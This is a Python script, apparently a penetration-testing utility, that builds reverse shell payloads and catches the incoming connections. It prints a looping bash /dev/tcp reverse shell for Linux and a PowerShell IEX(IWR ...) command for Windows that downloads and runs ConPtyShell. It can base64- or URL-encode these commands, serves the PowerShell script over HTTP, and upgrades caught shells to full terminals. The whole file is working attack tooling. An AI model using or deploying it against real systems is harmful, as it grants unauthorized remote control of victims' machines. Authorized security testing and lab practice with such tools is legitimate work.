#!/usr/bin/env python3

import os
import sys
import argparse
import socket
import fcntl
import struct
import threading
import queue
import sys
import tty
import termios
import base64
import urllib.parse

SIOCGIFADDR = 0x8915

def get_ip_address(interface):
    try:
        # Create a socket to get the IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = fcntl.ioctl(
            s.fileno(),
            SIOCGIFADDR,
            struct.pack('256s', interface[:15].encode('utf-8'))
        )[20:24]
        return socket.inet_ntoa(ip)
    except OSError:
        print(f"Error: Could not get IP address for interface {interface}.")
        sys.exit(1)

def create_reverse_shell(ip, port, os, encode, http_server_port, auto_upgrade):
    if os == 'linux':
        reverse_shell_cmd = f"bash -c 'while true; do bash -i >& /dev/tcp/{ip}/{port} 0>&1 || exit; sleep 1; done'"
    elif os == 'windows':
        if auto_upgrade:
            reverse_shell_cmd = f"{ip} {port}"
        else:
            reverse_shell_cmd = f"""IEX(IWR http://{ip}:{http_server_port}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell {ip} {port}"""
    if encode == 'base64':
        reverse_shell_cmd = base64.b64encode(reverse_shell_cmd.encode()).decode()
    elif encode == 'url':
        reverse_shell_cmd = urllib.parse.quote(reverse_shell_cmd)
    print(f"Reverse shell command:\n{reverse_shell_cmd}")

def linux_shell(conn, exit_the_whole_thing):
    # Full TTY plz ðŸ˜Œ
    conn.sendall("stty raw -echo < /dev/tty; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || true \n export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116;\n".encode())
    shell(conn, exit_the_whole_thing)

def shell(conn, exit_the_whole_thing):
    while True:
        # Create queues for thread communication
        command_queue = queue.Queue()
        exit_event = threading.Event()
        def receive_data():
            while not exit_event.is_set():
                try:
                    data = conn.recv(1024)
                    if not data:
                        exit_event.set()
                        break
                    decoded = data.decode().replace('\n', '\r\n')
                    print(decoded, end='', flush=True)
                except:
                    exit_event.set()
                    break

        def get_char():
            fd = sys.stdin.fileno()
            old_settings = termios.tcgetattr(fd)
            try:
                tty.setraw(sys.stdin.fileno())
                ch = sys.stdin.read(1)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            return ch

        def send_data():
            while not exit_event.is_set():
                try:
                    char = get_char()
                    if char == '\x04':  # Ctrl+D
                        exit_event.set()
                        exit_the_whole_thing.set()
                    conn.sendall(char.encode())
                except:
                    exit_event.set()
                    break

        # Start threads
        receive_thread = threading.Thread(target=receive_data)
        send_thread = threading.Thread(target=send_data)
        receive_thread.daemon = True
        send_thread.daemon = True

        receive_thread.start()
        send_thread.start()

        # Wait for threads to finish
        send_thread.join()
        if exit_the_whole_thing.is_set():
            sys.exit(0)
        receive_thread.join()

def windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port):
    if auto_upgrade:
        conn.sendall("powershell -ep Bypass\n".encode())
        conn.sendall(f"IEX(IWR http://{ip}:{http_server_port}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell -Upgrade -Rows 38 -Cols 116\n".encode())
    shell(conn, exit_the_whole_thing)

def start_http_server(port):
      # Start a simple HTTP server to serve PowerShell Empire files
      http_server_thread = threading.Thread(target=lambda: os.system(f'cd /usr/share/make-me-a-shell && python3 -m http.server {port}'))
      http_server_thread.daemon = True
      http_server_thread.start()
      print(f"Started HTTP server on port {port} serving ConPtyShell")

def listen_for_connection(port, os, http_server_port, ip, auto_upgrade):
    if os == 'windows':
        start_http_server(http_server_port)

    # Use socket to listen for incoming connections
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', port))
        s.listen()
        print(f"Listening on port {port}...")
        while True:
            exit_the_whole_thing = threading.Event()
            try:
                conn, addr = s.accept()
                with conn:
                    conn.settimeout(1.0)
                    print(f"Connected by {addr}")

                    if os == 'linux':
                        linux_shell(conn, exit_the_whole_thing)
                    elif os == 'windows':
                        windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port)

            except KeyboardInterrupt:
                print("Fuck, lost connection, reconnecting...")
                try:
                    conn.shutdown(socket.SHUT_RDWR)
                except:
                    pass
                conn.close()

def get_random_port():
    # Use socket to get a random available port
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]

def main():
    parser = argparse.ArgumentParser(description="Make me a reverse shell.")
    parser.add_argument('-i', '--interface', default='tun0', help='Network interface to get IP address from (default: tun0)')
    parser.add_argument('-p', '--port', type=int, default=0, help='Port number to use for the reverse shell, use 0 for random port')
    parser.add_argument('-a', '--auto-upgrade', action='store_true', help='Auto upgrade the shell (if you have a bare remote connection from exploit)')
    parser.add_argument('-P', '--http-server-port', type=int, default=0, help='Port number to use for the HTTP server, use 0 for random port')
    parser.add_argument('-o', '--os', choices=['linux', 'windows'], default='linux', help='Operating system to use for the reverse shell')
    parser.add_argument('-e', '--encode', choices=['base64', 'url', 'none'], default='none', help='Encode the reverse shell command')

    args = parser.parse_args()

    if args.port == 0:
        args.port = get_random_port()

    if args.http_server_port == 0:
        args.http_server_port = get_random_port()

    ip = get_ip_address(args.interface)
    create_reverse_shell(ip, args.port, args.os, args.encode, args.http_server_port, args.auto_upgrade)
    listen_for_connection(args.port, args.os, args.http_server_port, ip, args.auto_upgrade)

if __name__ == "__main__":
    main()

